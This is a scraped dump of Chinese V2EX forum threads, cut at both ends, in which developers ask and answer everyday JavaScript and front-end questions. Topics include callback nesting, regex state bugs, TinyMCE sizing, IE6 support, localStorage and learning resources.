可解！", "太漂亮了。。", "果然还是回调有层次感更好看……", "我觉得这种层次感太好看了。", " 逻辑这么清晰，没有 bug ，为什么要改呢", "楼主，我想引用一下你这个截图，我懒得自己截了，可以吗？", "传说中的某间谍偷了某国卫星发射的代码最后一页，结果这一页上全是“}”吗。。。", " 拿去随便用不要客气", " 全是「)」。", " JS 发射火箭好时髦啊！", " 那个段子似乎是 )))))))))))))))))))))\r", "perl ?", " lisp", "The Art and Essence of JavaScript Programming ！", "大 JS 的特色呀~多霸气~", "make it work with docs, then make it better with better docs", "```js\r", "var runFrom = function(step, lastStep, callback) {\r", "  var cb = step >= lastStep ? callback : function() {\r", "    runFrom(step + 1, lastStep, callback);\r", "  };\r", "  this['step' + step].call(this, cb);\r", "};\r", "\r", "runFrom(1, 17, function() {\r", "  console.log('finally done...');\r", "});\r", "```", "呃\r", "\r", "挺好看的呀", "碉堡天了", "我记得快半年前知乎上被扒出来过", "业余 js 写手, 用 rxjs/promise 什么可以好看一些吧.\r", "\r", "我觉得这个动画逻辑是代码生成的", "快滴的啊，以前就 8 出来过", "说不定这是某个后端临危受命写出来的，如果时间比较紧，能写出来也不容易了。", "可破 ", "到底我都懂，所以为什么 91 行的高亮不一样", " 同求这个问题", "道理我都懂，所以为什么 91 行的高亮不一样", "排版挺漂亮的 。。", "好牛逼", "传说中的回调金字塔。\r", "\r", "91 行是金字塔的入口。", "知乎上看到的显示 5 星的\r", "\r", "var get_rating_string = function(rating) {\r", "    return \"★★★★★☆☆☆☆☆\".substring(5 - rating, 10 - rating);\r", "};", "91 行：难道是传说中 x088 入口？", " 我也比较关注这个问题，难道是 Sublime Text 的 bug?", " 可怕 又碰到学长 学长乃 V2EX 小能手", "还以为是通过工具生成的呢，好恐怖", " 0x88 入口是个啥？", "\r", "\r", "看我这循环…", "快的打车的网页。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>大家有好的 nodejs+mongodb 项目吗？求分享</p>\n</div></div>"], "reply": "5", "tittle": "nodejs 项目", "comment": ["厚颜无耻自荐一波: ", ", demo 地址: ", "我知道 cnodejs 社区就是 node  + mongodb\r", "\r", "我们的网站也是：\r", "\r", "汇智网， ", " 。", "acdream.info  ", "谢谢大家"]},
{"content": ["<div class=\"topic_content\">没有时间去造轮子了。</div>"], "reply": "1", "tittle": "有没有类似 jqTransform 的表单美化插件", "comment": ["就用它不就好了…… 有 bug 也是可以解决的……\r", "\r", "还是 jqTransform\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>问题发这了,还没人回\n<a href=\"http://community.tinymce.com/forum/viewtopic.php?id=36512\" rel=\"nofollow\">http://community.tinymce.com/forum/viewtopic.php?id=36512</a></p>\n</div></div>"], "reply": "3", "tittle": "tinymce 如何才能高度自动满屏？", "comment": ["```\r", "function doresize(){\r", "    var ht = window.innerHeight;\r", "    console.log(\"ht = \" + ht);\r", "\r", "    if (document.getElementsByClassName('mce-toolbar-grp')){\r", "        ht += -document.getElementsByClassName('mce-toolbar-grp')[0].offsetHeight;\r", "        ht += -document.getElementsByClassName('mce-toolbar-grp')[0].offsetTop;\r", "        console.log(\"ht = \" + ht);\r", "    }\r", "    if (document.getElementsByClassName('mce-statusbar')){\r", "        ht += -document.getElementsByClassName('mce-statusbar')[0].offsetHeight;\r", "        console.log(\"ht = \" + ht);\r", "    }\r", "\r", "    ht += -3; // magic value that changes depending on your html and body margins\r", "\r", "    if (document.getElementsByClassName('mce-edit-area')){\r", "        document.getElementsByClassName('mce-edit-area')[0].style.height = ht + \"px\";\r", "        console.log(\"ht = \" + ht);\r", "    }\r", "\r", "}\r", "\r", "window.onresize=doresize;\r", "window.onload=doresize;\r", "```\r", "\r", "这样可以但是很挫，能用 css 解决么", "话说为啥有时候回复用 markdown 格式可以，有时候不行\r", "test `test`", " 回复从来都不支持 markdown ……只有发帖支持，而且只支持部分 markdown 特性"]},
{"content": ["<div class=\"topic_content\">注意看变量reg的位置变化\r<br><img src=\"http://ww1.sinaimg.cn/large/96ced919jw1f337arf51ej20w60gudk5.jpg\" class=\"embedded_image\" border=\"0\"> \r<br>\r<br><img src=\"http://ww3.sinaimg.cn/large/96ced919jw1f337b87cfaj210a0goaec.jpg\" class=\"embedded_image\" border=\"0\"> \r<br>\r<br><div><a target=\"_blank\" href=\"https://gist.github.com/isbaseby/705828a6e9aed2388386d43a1e374e80\">https://gist.github.com/isbaseby/705828a6e9aed2388386d43a1e374e80</a> <button onclick=\"lazyGist(this)\"> 显示 Gist 代码 </button></div>\r<br>\r<br>```\r<br>function filtrate2() {\r<br>    var newArr = [], reg = /^\\s*$/g,\r<br>        str = \"baidu,google, ,   ,baidu,google,bg\";\r<br>        arr = str.split(',');\r<br>    for (var i = 0; i &lt; arr.length; i++) {\r<br>        //var reg = /^\\s*$/g;\r<br>        if (!reg.test(arr[i])) {\r<br>            newArr.push(arr[i]);\r<br>        }\r<br>    }\r<br>    return newArr;\r<br>}\r<br>\r<br>//执行结果  [\"baidu\", \"google\", \"   \", \"baidu\", \"google\", \"bg\"]\r<br>\r<br>\r<br>\r<br>function filtrate2() {\r<br>    var newArr = [], reg = /^\\s*$/g,\r<br>        str = \"baidu,google, ,   ,baidu,google,bg\";\r<br>        arr = str.split(',');\r<br>    for (var i = 0; i &lt; arr.length; i++) {\r<br>        var reg = /^\\s*$/g;\r<br>        if (!reg.test(arr[i])) {\r<br>            newArr.push(arr[i]);\r<br>        }\r<br>    }\r<br>    return newArr;\r<br>}\r<br>\r<br>//执行结果  [\"baidu\", \"google\", \"baidu\", \"google\", \"bg\"]\r<br>```\r<br>\r<br>我觉得是和 js 的作用域有关，但又说不清楚，请各位赐教。</div>"], "reply": "7", "tittle": "遇到一个奇怪的 js 问题", "comment": [" Thanks", "function filtrate2() { \r", "    var newArr = [], reg = /^\\s*$/g, \r", "    str = \"baidu,google, , ,baidu,google,bg\"; \r", "    arr = str.split(','); \r", "    for (var i = 0; i < arr.length; i++) { \r", "    if (!reg.test(arr[i])) { \r", "        newArr.push(arr[i]); \r", "    } \r", "        reg.lastIndex = 0;\r", "    } \r", "    return newArr; \r", "}", "arr = str.split(','); 导致的，这里的 arr 是全局对象下的 arr\r", "前面一行最后面是分号，不是逗号！！！！", "啊，看错题了，忽略上一条 0.0", "1 楼说得对，是因为 lastIndex 被改变了，重新定义的 reg 对象又初始化了 lastIndex", " 这个细节没注意到\r", " \r", "\r", "Thanks"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>JSConf  is a two-day developer-driven non-profit event focused on JavaScript and Node.js technologies. We bring together notable figures from both the Chinese and international JavaScript communities to share their knowledge and passion for JavaScript. Here is the program for the past years 2012, 2013, 2014, 2015. You can check out the videos from 2015 JSConf China in Shenzhen on YouTube and Tudou. This year we will hold the JSConf China in Nanjing on <strong>September 3rd-4th, 2016</strong>.</p>\n<p><a href=\"http://2016.jsconf.cn/#/?_k=kh4bh1\" rel=\"nofollow\">Official Website</a></p>\n<p><img alt=\"NingJS\" src=\"http://ww1.sinaimg.cn/mw690/005xa5uIgw1f2fzuxsa4jj30k00ci768.jpg\"></p>\n<p>Join us on Github: <a href=\"https://github.com/jsconfcn/NingJS\" rel=\"nofollow\">https://github.com/jsconfcn/NingJS</a></p>\n<p>Find us on <a href=\"http://weibo.com/jsconfchina?sudaref=2016.jsconf.cn\" rel=\"nofollow\">Weibo</a> &amp; <a href=\"https://twitter.com/jsconfchina\" rel=\"nofollow\">Twitter</a></p>\n</div></div>"], "reply": "2", "tittle": "JSConf China 2016 in 南京 (NingJS 2016) is coming! 我们正在寻找场地，讲师，赞助商和摄影团队！", "comment": ["九月份... 开学了啊呜呜", "哇塞 支持支持。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>昨天看了张鑫旭老师的文章<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"http://www.zhangxinxu.com/wordpress/2016/01/interview-of-frentend-early-reading-class/\">http://www.zhangxinxu.com/wordpress/2016/01/interview-of-frentend-early-reading-class/</a><br>\n推荐了很多前端学习方法，也提到了他经常上的国外知名的前端学习站点：</p>\n\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.sitepoint.com/\">http://www.sitepoint.com/</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://maxdesign.com.au/\">http://maxdesign.com.au/</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.smashingmagazine.com/\">http://www.smashingmagazine.com/</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://css-tricks.com/\">https://css-tricks.com/</a></li>\n</ul>\n\n<p>但大多偏重于 CSS ，我想求一些 <strong>JavaScript 相关</strong> 的站点或博客。<br>\n目前知道的有</p>\n\n<ul>\n<li>阮一峰老师的博客</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.2ality.com/\">http://www.2ality.com/</a></li>\n</ul>\n</div></div>", "<div class=\"topic_content\">感谢大家收藏，可是我是来求推荐的啊喂…==</div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>列举一些答案，加上自己后来找到的，先看一看，当然其他的也很好，因人而异：</p>\n\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://uptodate.frontendrescue.org/zh/\">https://uptodate.frontendrescue.org/zh/</a>  资料整理（很棒）</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://es6.ruanyifeng.com/\">http://es6.ruanyifeng.com/</a> 阮一峰老师的 ES6 书</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://facebook.github.io/react/blog/\">http://facebook.github.io/react/blog/</a> React blog</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://developers.google.com/web/updates/\">https://developers.google.com/web/updates/</a> 谷歌的开发者中心的 web 频道</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.jstips.co/\">http://www.jstips.co/</a> JavaScript 技巧</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.smashingmagazine.com/\">https://www.smashingmagazine.com/</a> 资料</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://jsfeeds.com/\">http://jsfeeds.com/</a> 资讯</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://div.io\">http://div.io</a> 资料</li>\n</ul>\n</div></div>"], "reply": "29", "tittle": "前端学习站点或博客，求补充", "comment": ["MDN", "see ", "前端乱炖", "额，你值得拥有 ", "还有这个 ", "jsfeeds", "V 妞的博客： ", "\r", "\r", "echoJs 就够了。每天文章多到你看不完。", "又到了打小广告的时间： ", "新一轮晒博客时间到了", " \r", " 感谢回复，有很多 JavaScript 的新资讯。", " 不错的博客，感谢", " 感谢回复，我看过您的这个帖子，不过很多个人博客很久都没更新了，不是我想要的。我希望找几个网站每个月都花一些时间仔细来读。", "前端学习怎么能少得了 MDN 呢  ", "MDN 真的超有用\r", "\r", "html5 rocks", "以前收集过一些\r", " ", "\r", "\r", "这里专门搜集 GitHub 上用 issue 写博客的高手的文章,欢迎丰富起来", "有人整理了个前端导航，可以看看，话说其实前端资料太多\r", "如何跟上前端开发的最新前沿：\r", "\r", "\r", "前端必备 iOS App W3 ：\r", " \r", " \r", " 是的是的，平时用 MDN 查一些函数作用，咨迅什么的没有看过，求正确使用姿势...", " 好全面，能移除一些失效的链接就更好了", " \r", " 很多资料，感谢~以后仔细看看", " 感谢！！", "奇舞周刊", " 广告，别点~", " 前端导航，集合了博客，公众号，开发社区......."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题：求介绍</p>\n</div></div>"], "reply": "4", "tittle": "有什么优秀的开源项目是用 ES6 写的？", "comment": ["ThinkJS 2\r", "\r", "\r", "我的博客也是基于 ES6 写的（明明是因为用了 ThinkJS ），但是目前没有开源。 ", "[babel] ", "不知道算不算优秀，反正看起挺不错的，强烈安利个好工具（渗透人员必备）：\r", "\r", "个人感觉就是中国菜刀的开源版本，不过更人性化，功能也很强大！代码是 ES6 编写的", "node-bigpipe\r", "\r", "轻量级 bigpipe 模块，支持 express 、 sails 、 thinkjs 等 web 框架，无侵入。 也包含 es5 版本\r", "\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"http://i.imgur.com/5Udg5hL.png\"></p>\n<p><em>原文： <a href=\"https://twitter.com/slicknet/status/722861690765705218\" rel=\"nofollow\">https://twitter.com/slicknet/status/722861690765705218</a></em></p>\n<p><strong>抛开 JSLint 与 ESLint 来说，大家更喜欢谁？</strong></p>\n</div></div>"], "reply": "8", "tittle": "Douglas Crockford VS Nicholas C. Zakas", "comment": ["我最喜欢 jscs 因为它的检查选项比其他的 linter 多得多", "毫无疑问 ESLint. JSLint 可能都算不上一个现代化的 Lint 工具. 你看下 JSLint 的 repo ", " 不像一个工程化项目，扩展性也不好.\r", "\r", "ESLint 刚出来时写过一篇文章说为什么要做 ESLint ", " .", "ESLint", "看过 JavaScript The Good Parts 所以不喜欢 Douglas Crockford ，讲真，这书现在看来没多大价值，却被捧得太高了。\r", "其实就像 jslint ，主要是在 JS 开发还是一片荒漠的时代做的一些研究探索，所以有着先驱者的意义，等到 JS 开发日趋成熟，就可以退出历史舞台了。", "JSHint", "ESLint +1", " ESLint 支持的规则比 JSCS 多得多\r", "而且 JSCS 团队已经并到 ESLint ， ESLint 中可能没覆盖到的部分也要被补全了\r", "JSHint"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>1Player for <a href=\"http://music.163.com\" rel=\"nofollow\">music.163.com</a></h1>\n<p>使用 1Player 控制你的网易云音乐播放器，通过快捷键可以在做其他工作时方便地控制歌曲免除来回切换的烦恼。</p>\n<p>样式参考<a href=\"https://www.anotherhome.net/file/APlayer/\" rel=\"nofollow\">APlayer</a></p>\n<h4><a href=\"https://chrome.google.com/webstore/detail/1player/bbleianliopbinjkpnmnhikiplblaifl?hl=zh-CN\" rel=\"nofollow\">下载地址</a></h4>\n<h4><a href=\"https://github.com/zhiyul/1Player\" rel=\"nofollow\">github</a></h4>\n<p>觉得不错就给个星星吧✨</p>\n<h2>Introduction</h2>\n<h4>Screenshot</h4>\n<p><img alt=\"image\" src=\"http://7xls2e.com1.z0.glb.clouddn.com/1player_1.png\"></p>\n<h4>自定义快捷键</h4>\n<p><img alt=\"image\" src=\"http://7xls2e.com1.z0.glb.clouddn.com/1player_2.png\"></p>\n<h2>Version</h2>\n<h4>1.0.2</h4>\n<ul>\n<li>修改了一些 bug</li>\n</ul>\n<h4>1.0.1</h4>\n<ul>\n<li>插件面板同步当前播放歌曲信息</li>\n<li>插件面板可控制 上一曲、下一曲、暂停 /播放、播放进度、播放模式</li>\n<li>点击插件面板的歌曲 /歌手可快速进如对应歌曲 /歌手页面</li>\n<li>快捷键控制 上一曲、下一曲、暂停 /播放、复制当前播放歌曲链接至剪切板</li>\n</ul>\n</div></div>"], "reply": "24", "tittle": "1Player for 网易云音乐 (chrome 插件)", "comment": ["持续更新中，欢迎各种意见和建议 ♪(^∇^*)", "客户端用着挺好的啊，也有快捷键啊", "非常不错，支持楼主。", "为什么不做成 crx 插件？", " 这难道不是 crx 插件？", " 啊 我平常习惯用 web 页，不喜欢开一堆 app 。", " 感谢", " chrome 商店可以直接下载哈", "插件好不好我没体验不知道，但是楼主的博客&&html5 插件真的做得 very nice👍", " 感谢 \\(≧▽≦)/", "diygay 的名气越来越大了", " 这是谁，变态吗（逃", "  APlayer 样式参考网易云，你参考 APlayer....233", "为什么我打开网易云音乐之后点扩展还是连不上？", " 这里面一定有不可告人的 py 交易", " 刷新一下网易云的页面蛤，或者点扩展里的“打开网易云”打开", "我不会告诉你，我键盘自定义的控制按键", "  ", " ", " 我现在知道了 :smirk:", " 懂事", "lz 也喜欢 wuli IU 吗？\r", "\r", "\r", "#你知道吗   IU 生日的哪张专辑音源已公布就各大榜单 all kill?", " #你知道吗， orxxx 是变态。", "有考虑做成 packaged app 形式的应用么？", " 暂时没有，那样的话直接用网易云的客户端就好了(∩_∩)"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Say I have some strings,</p>\n<pre><code>var string1 = \"hey this is jack and michael\";\nvar string2 = \"hey this is jack and jenny\";\n</code></pre>\n<p>And I have an array of strings:</p>\n<pre><code>var arr = ['jack', jenny'];\n</code></pre>\n<p>How do you write a function so that:</p>\n<pre><code>fn(string2, arr); // true\nfn(string1, arr); // false\n</code></pre>\n<p>Kind of like String.indexOf() or regex with a|b|c, but no individually.</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>渣渣...</p>\n<pre><code>function containsAll(haystack, needles){\n\tfor (var i = 0; i &lt; needles.length; i++){\n\t\tif (haystack.indexOf(needles[i]) === -1)\n\t\treturn false;\n\t}\n\treturn true;\n}\n</code></pre>\n</div></div>"], "reply": "10", "tittle": "How do you check if a string contains ALL strings from another array?", "comment": ["虽然不知道为什么要用英文。你的数组缺少一个闭合。\r", "另外最简单的办法，如果你的字符串都是以空格分隔的。那就把第一个 string 参数分割成数组。然后再去判断。用不着正则的感觉。。。", "python 版：\r", "\r", "def fn(str, arr):\r", "____return all(x in str for x in arr)", " 中文太差 表达不清", "这个其实就是多模式匹配，比较好的方法是使用 W-M 或者 A-C 算法可以做到 O(m+n)，或者没啥要求或者数量较小就像最后那个 for 里面逐个查找也可以。", "java 版 BiPredicate<String, List<String>> fun = (str, arr) ->  arr.stream().allMatch(str::contains);", "arr.every((s) => string1.contains(s));", "AC 自动机 应该有 java 版的", "javascript:\r", "\r", "function containsAll(haystack, needles) {\r", "\treturn !!haystack.match(new RegExp('('+needles.join('|')+')'));\r", "}", "我还以为进来能看到有人讨论 AC 自动机，没想到一群写循环的……", "VIML\r", "\r", "let s:str1 = \"hey this is jack and michael\"\r", "let s:str2 = \"hey this is jack and jenny\"\r", "let s:list = ['jack', 'jenny']\r", "\r", "fu! s:checkstr(str,list)\r", "    if 0 < index(split(a:str,' '),a:list[0]) && index(split(a:str,' '),a:list[0]) < index(split(a:str,' '),a:list[1])\r", "        return \"true\"\r", "    else\r", "        return \"false\"\r", "    endif\r", "endf\r", "\r", "echom s:checkstr(s:str1,s:list)\r", "echom s:checkstr(s:str2,s:list)"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近在看  <a href=\"https://github.com/oneuijs/You-Dont-Need-jQuery/blob/master/README.zh-CN.md\" rel=\"nofollow\">You-Dont-Need-jQuery</a> ，想模拟 <a href=\"https://github.com/rmurphey/js-assessment\" rel=\"nofollow\">js-assessment</a> 写一些测试来检验掌握程度，目前遇到如下问题：</p>\n<ol>\n<li>测试用例怎么写？由于这里主要涉及 dom 操作，与测试 function 输入输出相比略有不同，不知如何下手。</li>\n<li>搜索一番发现 sinon 似乎可以做到，但看了文档不是很明白。请问除了之外还有什么可以测试 dom 操作？</li>\n</ol>\n</div></div>"], "reply": "目前尚无回", "tittle": "请教：关于单元测试及 sinon 的使用。", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>背景知识： Google Chrome Frame ，谷歌浏览器内嵌框架（简称 GCF ），是一个使你机器上的 Internet Explorer 系列浏览器鸟枪换炮，用上 webkit 内核的 Chrome 引擎，但 IE 浏览器外观上还是 IE 的外观的免费插件。\n网页的 meta 信息中加入一句：</p>\n&lt;meta http-equiv=\"X-UA-Compatible\" content=\"chrome=1\"&gt;\n<p>即可使用。</p>\n<p>提供一个友好的引导安装界面呢， Google 帮我们解决了这个问题。\n&lt;script type=\"text/javascript\" src=\"&amp;lt;a href=\" http:=\"\" &lt;a=\"\" href=\"http://ajax.googleapis.com\" rel=\"nofollow\"&gt;ajax.googleapis.com=\"\" ajax=\"\" libs=\"\" chrome-frame=\"\" 1=\"\" CFInstall.min.js\"=\"\" rel=\"nofollow\"&gt;<a href=\"http://ajax.googleapis.com/ajax/libs/chrome-frame/1/CFInstall.min.js\" rel=\"nofollow\">http://ajax.googleapis.com/ajax/libs/chrome-frame/1/CFInstall.min.js</a>\"&gt;&lt;/script&gt; </p><div></div> &lt;script&gt; window.attachEvent(\"onload\", function() { CFInstall.check({ mode: \"overlay\", node: \"prompt\" }); }); &lt;/script&gt;\n<p>在 body 标签中加入这段 js 代码，可以使得 IE 打开该网页时出现友好的 GCF 安装引导 iframe 框。这段代码不需要存在于</p>\n\n<p>问题是， google 已经停止 GCF 这个项目了，而项目又要求 IE6 兼容，应该如何解决呢？有办法引入提示安装的功能吗？？</p>\n</div></div>"], "reply": "26", "tittle": "IE6 兼容性问题", "comment": ["问题， google 已经停止 GCF 这个项目了，而项目又要求 IE6 兼容，应该如何解决呢？有办法引入提示安装的功能吗？？", "你们要做的是停止支持！", "如果识别到 IE6 的 UA ，就返回插入提示的网页", " 错了，是回复", "直接给一个 chrome 的下载连接。 gcf 就是坑", "强迫用户升级到 IE 11/Edge ，或者换其他浏览器", "考虑到 IE6 用户顽固 /笨，应该特地不对其进行兼容\r", "要不然你收到的钱还不够支持这些客户的成本的", "不要依赖用户需要安装来兼容，自己想办法支持吧。", "目前国内 IE6 的用户已经低于 1%，除非是企业项目之类客户指定要求兼容 IE 6 ，否则都不应该再兼容 IE 6 了。", "我去， IE6 还没死透！？", "还没死？我都准备让 ie8 去死了", "IE8 都是个坑，必须 IE9 以上", "不要考虑 ie", "我们之前有做过兼容 ie6 ，不过兼容效果不好，难度也很大，最后效果也只是勉强可用，还是推荐客户起码升级到 ie8 吧。", "地狱模式", "强迫客户升级 ie 吧", "楼主，既然用户只能用 IE6 ，说明人家装不了 chrome ，所以谈论 Chrome Frame 没有意义吧\r", "\r", "还好我们客服中心已经升级到了火狐 8 ，对的，是 Firefox 8.0 ，喔呼~~~~~~~~~~~~~~", "PS ：楼上一堆吐槽 IE6-8 的，你们去让银行客服这种地方升级试试？", "已阅 容我再想想", "停止项目还是能下载到的。\r", "旧版的够你用了。\r", "\r", "支持 ie6 不难，要在 ie6 做出目前就行的东西基本不可能了。\r", "\r", "我已经在公司内部推广成功火狐，加油。", "加入 ie 检测代码就行，如果已经是 gcf 在跑页面，你的 ie6 检测出的就不会是 ie", "讲真，与其兼容 IE6 ，还不如为 IE6 这些该死的老旧浏览器重新做套页面", "首先，得确定你的用户群体里面有大量的 IE6 用户并且能带来一定的营收，不然没必要为这付出开发成本", "从没考虑过 IE ，我是不是错过了什么", "IE6 的兼容性问题，解决方法就是不做兼容，只提示浏览器过旧，建议用户升级或换用 Chrome 。", "了解了，还是提示换浏览器吧， 这是正道。"]},
{"content": ["<div class=\"topic_content\">window.getSelection 在 iOS 的 Safari 中不生效。</div>"], "reply": "1", "tittle": "iOS 中的 safari，有什么办法通过 js 选中指定的文本？", "comment": ["iOS 不同版本的情况也不一样，我试了很多次也没有达到一个完美的效果。\r", "给 id 为 content 的 textarea 的 touchstart 事件绑定了如下方法。。。\r", "var content = document.getElementById(\"content\");\r", "\t\t\tcontent.focus();\r", "\t\t\tcontent.selectionStart = 0;\r", "\t\t\tcontent.selectionEnd = content.value.length;"]},
{"content": ["<div class=\"topic_content\">我不懂代码，只是想修改一些简单的玩玩，就是关于获取 localStorage 已存储的数组，下面这个是个收藏列表，在主题旁边添加了个星星的图标，点一下星星亮，然后数组保存到 localStorage ，再点一下，星星暗，数组被删除，但是现在数组可以保存和删除，只是星星的亮和暗有点乱，我不知道怎么获得这个状态，希望有人能帮我看看。就是 69 行那里我该怎么写？或者帮我重新写一下这里的代码？？？先谢了。\r<br><img src=\"http://ww3.sinaimg.cn/large/0060lm7Tgw1f3859juybgg30mc1dx0v4.gif\" class=\"embedded_image\" border=\"0\"> \r<br>69 行那个_name 的数组我该怎么获得？\r<br>\r<br>\r<br>我是参考下面这个做的，这个是正常可用的，但是这个里的_name 数组是已知的，而且只有一位。\r<br><img src=\"http://ww1.sinaimg.cn/large/0060lm7Tgw1f3859iqf7rj30ke0otwka.jpg\" class=\"embedded_image\" border=\"0\"> </div>", "<div class=\"topic_content\">贴吧有人说用 window.localStorage.getItem()？我要是会还来这里发帖？我带着求助的心态来发帖，居然被黑成这样，呵呵呵，服的不要不要的了。</div>"], "reply": "24", "tittle": "JS 的问题，怎么获取 localStorage 已存储的数组？", "comment": ["说明一点 localStorage 中的数据都是以字符串存储的，所以你存进去之前要用 JSON.stringify 转换为文本，取出来的时候再用 JSON.parse 转换为对象， 当然，你也可以用第三方插件来实现，比如来 store.js", " 不要太复杂，我不会代码，只想修改一下，能用即可。可用写入读出列表，那么写入时候星星就是亮的，删除的时候星星就是暗的，我不知道该这么写，希望有人能帮我看一下，帮我写一段代码参考一下。无论如何，先谢了", " 伸手要来了，靠你了", "..这种 API 查下  不用发帖的时间就会了吧。", "开个价吧楼主", "楼主 我也不会 但我学了可以教你 你开个价吧", "这点功能需要写这么多代码？", "楼主，交出你的字体", "楼主可以先查一下 $.inArray() 的用法。\r", "这里是判断要处理的对象是否在 favoriteList 列表中，所以 _name 就是你要处理（加星去星）的对象。获取这个对象应该不难，查一下资料吧。\r", "不懂代码，只是玩玩，不是让别人直接写出代码的好理由。", " 对啊，就是获得这个对象不难，我才想找人帮我写一下，你觉得不难的我不会自然觉得难。我问的不就是你所描述的吗？我没问明白？@wayslog @", " 这俩要钱的，你们开个价我看看吧，呵呵。\r", " MSYH\r", " 老大你来写个简单的我也学学呗？\r", " 不会才来问，查了半天没查出半点头绪， stackoverflow 上的那帮老外比你们还难缠。\r", " 查哪个 API ？ inArray()？我是想知道_name 怎么获得的。\r", "\r", "OH MY F**KING GOD~", "大家散了吧，这种 SOB 越理他越来劲。", "楼主你发成图片是怕人复制你代码帮你 debug 吗？", "开价吧……", " 你脑袋是不是进水了？咋没把你淹死呢？\r", " 复制的代码全乱套了，不知道怎么发。", " 你开吧……", "这年头伸手党还有理了？", " 求着你了吗？", "就知道会开喷 见多了", "“我不懂代码，只是想修改一些简单的玩玩”\r", "\r", "你自己给自己招黑的 跟和别人说免费帮我写个软件有什么区别\r", "\r", "基本提问的礼貌都不懂", "好好学基础。一上来就整“高级货”，怪不得整天有人说浮躁", " 哈哈，我喜欢这个回复！下次遇见伸手党就这样说了", "感觉看完好无头绪啊，楼主要的功能应该挺简单的，但是怎么这么复杂。。", " 对啊，就是比较简单的问题，因为不懂所以来问，要是复杂的我就直接花钱找人做了，我说一他不敢说二，还用来这里跟这群狂人周旋？呵呵~V2 狂人太多，服服的了。", " 楼主的这不屑的语气是说的我们问你开价不对咯？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>前段时间做移动端开发时收集了一些基础函数并搞了个扫代码生成 util 库的工具，有兴趣围观下:)</p>\n<p><a href=\"http://liriliri.github.io/eustia/\" rel=\"nofollow\">http://liriliri.github.io/eustia/</a></p>\n<p><img alt=\"Eustia\" src=\"http://7xn2zy.com1.z0.glb.clouddn.com/eustia_screenshot.gif\"></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "JavaScript Util 库生成工具", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一个 web 版的赛跑竞猜游戏，需要保证赛跑过程对所有用户都是同步的，如何能够做到人物移动（赛跑）时的位置和速度数据同步展示？</p>\n</div></div>"], "reply": "24", "tittle": "web 版赛跑游戏如何做到所有用户进入页面都能同步看到同一时刻的赛跑进度？", "comment": ["这跟实时推送差不多吧.....", "websock\r", "\r", "当然，还是有延时。", "可以试试野狗……", "赛跑游戏不知道 赛艇游戏估计可以做到", "发一个我做的多人同步游戏，不过不是赛跑游戏。\r", "websocket", "野狗+1", " +1s", " 你们搞的这个同步技术啊， excited ！", "服务器和客户端同时做计算，同时服务器向客户端推送结果，本地先以本地的计算结果做显示，当因为延迟问题导致本地和远程计算结果不符的时候强行以服务器为标准同步即可。\r", "不管谁家的推送都解决不了延迟。", "这都能膜。。。", "根本不需要看好嘛，论赛跑，香港记者比谁都快", "signalR", " 好厉害啊", " 开源吗", "斗鱼直播", " 哪怕是赛乌龟有啥区别。。。。。主要还是数据多方同步\r", "这种一般就是本地逻辑在数据库记录，把地图切割成 9*9 方格，用户 A 在一个时间内坐标增加了多少， B 用户增加了多少，至于距离差距直接查接口啊， A 用户的坐标 B 用户的坐标，遇到网络延迟了谁也没办法", " 有区别 因为是钦点谁跑的快", " 没有开源，客户端代码可在浏览器看到，没有压缩。", " 你没理解他的意思。。", " 野狗是啥", " 一个后端即服务。右边就有链接。", " 好吧，开了 adblock 的表示没看到，不过已经找到官网了，谢谢", "firebase"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>网页上有按钮点击后打开 appstore ，直接 location.href=\"xxx\"不起作用，但我发现有些 H5 页面是可以这样做的，是需要在哪里申请吗？</p>\n</div></div>"], "reply": "9", "tittle": "新浪微博 ios 客户端怎么解除 itunes 跳转链接的限制？", "comment": ["简单的把 http 换成 itms 即可", " 不行，试过了", "itunes 跳转还是 app store 的跳转？", " appstore 的跳转", "发现有些网页是可以直接 location.href = '", "' 跳转到 appstore 的，推测与域名有关，但完全找不到相关的资料。", "额，遇到的几乎所有做 APP 的公司的页面都可以直接跳 App Store ，建议你研究下他们的网页吧，不需要申请别的资料，微博都可以直接跳。", "  问微博的客服了，得到的回复是微博禁止分发下载链接。", " 额，我今天看了下，微博最近确实是把 ios 的跳转禁了。不过还是有 3 个办法做到。\r", "1 、微博自己有应用市场，用那个连接可以跳到 App Store ，具体你可以看下 same app 的 h5 页面。\r", "2 、微博的广告，例如品牌速递的链接可以直接跳。\r", "3 、有一些 app 的链接是可以做到的，跟第一条差不多，建议你刷微博的时候看下粉丝通的广告，他们的 h5 可以直接跳。\r", "详细的得靠自己啦！", " 楼主，你问题解决了吗？下面这种如何做到的跳转？\r", "\r", "分享 